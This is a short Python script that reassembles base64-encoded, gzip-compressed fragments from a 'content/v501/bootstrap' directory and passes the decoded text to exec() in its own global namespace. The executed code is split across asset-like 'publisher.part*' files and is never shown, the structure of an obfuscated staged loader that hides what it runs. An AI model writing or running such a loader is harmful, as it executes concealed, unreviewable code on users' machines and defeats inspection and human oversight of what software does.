#!/usr/bin/env python3
from pathlib import Path
import base64, gzip

_boot = Path(__file__).resolve().parents[1] / 'content' / 'v501' / 'bootstrap'
_manifest = _boot / 'manifest.json.gz.b64'
_manifest.write_text(''.join(p.read_text(encoding='ascii') for p in sorted(_boot.glob('manifest.part*'))), encoding='ascii')
_payload = ''.join(p.read_text(encoding='ascii') for p in sorted(_boot.glob('publisher.part*')))
_code = gzip.decompress(base64.b64decode(_payload)).decode('utf-8')
exec(compile(_code, __file__, 'exec'), globals(), globals())
